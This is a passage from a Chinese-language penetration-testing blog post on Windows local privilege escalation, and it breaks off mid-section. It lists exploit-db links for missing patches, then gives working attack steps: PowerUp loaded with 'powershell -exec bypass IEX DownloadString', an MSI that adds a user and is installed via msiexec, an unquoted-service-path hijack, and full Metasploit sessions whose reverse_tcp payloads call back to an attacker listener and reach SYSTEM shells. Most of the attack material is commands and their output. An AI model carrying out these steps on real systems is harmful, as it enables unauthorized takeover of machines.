WMALFXGFXDSP.dll (MS-16-007), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#x27; MCL File, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - &#x27;els.dll&#x27; DLL Planting (MS15-134)</span><br><span class="line">[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important</span><br><span class="line">[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &#x27;Sandworm&#x27; Exploit (MS14-060), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical</span><br><span class="line">[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34458/</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical</span><br><span class="line">[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important</span><br><span class="line">[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important</span><br><span class="line">[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical</span><br><span class="line">[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical</span><br><span class="line">[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical</span><br><span class="line">[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical</span><br><span class="line">[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical</span><br><span class="line">[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical</span><br><span class="line">[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical</span><br><span class="line">[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical</span><br><span class="line">[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important</span><br><span class="line">[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC</span><br><span class="line">[*] </span><br><span class="line">[*] done</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Sherlock-ps1脚本查看漏洞"><a href="#4-Sherlock-ps1脚本查看漏洞" class="headerlink" title="4.Sherlock.ps1脚本查看漏洞"></a>4.Sherlock.ps1脚本查看漏洞</h3><p><code>首先上传到目标主机</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload Sherlock.ps1 C:</span><br><span class="line">[*] uploading  : /root/Sherlock.ps1 -&gt; C:</span><br><span class="line">[*] uploaded   : /root/Sherlock.ps1 -&gt; C:\Sherlock.ps1</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>目标主机执行脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Sherlock</span><br><span class="line">PS C:\&gt; Find-AllVulns &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>查看out.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/11199/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Task Scheduler .XML</span><br><span class="line">MSBulletin : MS10-092</span><br><span class="line">CVEID      : 2010-3338, 2010-3888</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/19930/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MSBulletin : MS13-053</span><br><span class="line">CVEID      : 2013-1300</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/33213/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MSBulletin : MS13-081</span><br><span class="line">CVEID      : 2013-3881</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/31576/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : ClientCopyImage Win32k</span><br><span class="line">MSBulletin : MS15-051</span><br><span class="line">CVEID      : 2015-1701, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/37367/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Font Driver Buffer Overflow</span><br><span class="line">MSBulletin : MS15-078</span><br><span class="line">CVEID      : 2015-2426, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/38222/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : &#x27;mrxdav.sys&#x27; WebDAV</span><br><span class="line">MSBulletin : MS16-016</span><br><span class="line">CVEID      : 2016-0051</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/40085/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Secondary Logon Handle</span><br><span class="line">MSBulletin : MS16-032</span><br><span class="line">CVEID      : 2016-0099</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/39719/</span><br><span class="line">VulnStatus : Not Supported on single-core systems</span><br><span class="line"></span><br><span class="line">Title      : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MSBulletin : MS16-034</span><br><span class="line">CVEID      : 2016-0093/94/95/96</span><br><span class="line">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Win32k Elevation of Privilege</span><br><span class="line">MSBulletin : MS16-135</span><br><span class="line">CVEID      : 2016-7255</span><br><span class="line">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Nessus Agent 6.6.2 - 6.10.3</span><br><span class="line">MSBulletin : N/A</span><br><span class="line">CVEID      : 2017-7199</span><br><span class="line">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-windows系统配置错误利用"><a href="#0x02-windows系统配置错误利用" class="headerlink" title="0x02.windows系统配置错误利用"></a>0x02.windows系统配置错误利用</h2><h3 id="1-系统服务权限配置错误"><a href="#1-系统服务权限配置错误" class="headerlink" title="1.系统服务权限配置错误"></a>1.系统服务权限配置错误</h3><blockquote><p>windows server 可创建长久运行的可执行程序，若能获取的修改windows server配置权限， 通过把服务启动的二进制文件替换为恶意二进制文件，可以获得system权限</p><p>服务未运行：使用恶意程序替换，然后重启服务<br>服务正在运行且无法终止：符合绝大多数的漏洞利用场景，使用 DLL劫持技术并尝试重启服务</p></blockquote><h4 id="01-PowerUp-ps1脚本检查服务漏洞"><a href="#01-PowerUp-ps1脚本检查服务漏洞" class="headerlink" title="01.PowerUp.ps1脚本检查服务漏洞"></a>01.PowerUp.ps1脚本检查服务漏洞</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msf的exploit-windows-local-sercice-permissions模块提权"><a href="#02-msf的exploit-windows-local-sercice-permissions模块提权" class="headerlink" title="02.msf的exploit/windows/local/sercice_permissions模块提权"></a>02.msf的exploit/windows/local/sercice_permissions模块提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2956 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;exit</span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/service_permissions </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt;    </span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/service_permissions):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)</span><br><span class="line">   SESSION     1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT     10               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[-] The registry technique will be skipped because the payload architecture does not match the native system architecture</span><br><span class="line">[*] Trying to add a new service...</span><br><span class="line">[*] Created service... CnoKgsk</span><br><span class="line">[+] Service should be started! Enjoy your new SYSTEM meterpreter session.</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49169) at 2021-07-28 09:16:46 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2832 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-注册表键AlwaysInstallElevated提权"><a href="#2-注册表键AlwaysInstallElevated提权" class="headerlink" title="2.注册表键AlwaysInstallElevated提权"></a>2.注册表键AlwaysInstallElevated提权</h3><blockquote><p>原因：开启了windows installer 特权安装功能</p><p>cmd输入gpedit.msc——计算机配置——管理模块——windows组件——windows installer</p><p>cmd输入gpedit.msc——用户配置——管理模块——windows组件——windows installer</p></blockquote><h4 id="01-powerup利用"><a href="#01-powerup利用" class="headerlink" title="01.powerup利用"></a>01.powerup利用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powerup下的Get-RegistryAlwaysInstallElevated模块检查注册表键是否被设置</span><br><span class="line">如果被设置则意味MSI文件是以system权限下能运行</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查是否被设置</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Get-RegistryAlwaysInstallElevated</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行Write-UserAddMSI模块，生成MSI文件</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Write-UserAddMSI</span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行MSI文件</span></span><br><span class="line">msiexec /quiet /qn /i UserAdd.msi</span><br></pre></td></tr></table></figure><img src="/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210728215541363.png" class><h4 id="02-msf的exploit-windows-local-always-install-elevated模块提权"><a href="#02-msf的exploit-windows-local-always-install-elevated模块提权" class="headerlink" title="02.msf的exploit/windows/local/always_install_elevated模块提权"></a>02.msf的exploit/windows/local/always_install_elevated模块提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/service_permissions) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49171) at 2021-07-28 09:43:34 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 936 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-可信任服务路径漏洞"><a href="#3-可信任服务路径漏洞" class="headerlink" title="3.可信任服务路径漏洞"></a>3.可信任服务路径漏洞</h3><blockquote><p>Trusted Service Paths漏洞利用了windows文件路径解析的特性，通俗的说，如果一个服务的可执行文件的路径（带空格）并且没有被双引号引起来，那么这个服务就有漏洞。</p><p>例如：有一个文件路径C:\Program Files\Some Folder\Service.exe，操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。</p><p>本例中会依次尝试执行以下程序：</p><p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe</p><p>如果我们在C盘上传一个名为Program.exe的恶意程序，可能就会以system权限执行该程序，从而达到提权的目的。</p></blockquote><h4 id="01-测试漏洞是否存在"><a href="#01-测试漏洞是否存在" class="headerlink" title="01.测试漏洞是否存在"></a>01.测试漏洞是否存在</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;    #查找没有被引号引起来的服务</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files (x86)&quot;    #检测目标文件夹是否有写权限</span><br><span class="line">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户都具有修改这个文件夹的权限</span><br><span class="line">(M):修改</span><br><span class="line">(F):完全控制</span><br><span class="line">(CI):从属容器将继承访问控制项</span><br><span class="line">(OI):从属文件将继承访问控制项</span><br><span class="line">Everyone:(OI)(CI)(F):对该文件夹，用户有读、写、删除、下载其文件、删除其子目录的权限</span><br><span class="line"></span><br><span class="line">确认存在此漏洞，把要上传的程序重命令并放置在存在此漏洞且可写的目录下，执行如下命令:</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="02-msf利用"><a href="#02-msf利用" class="headerlink" 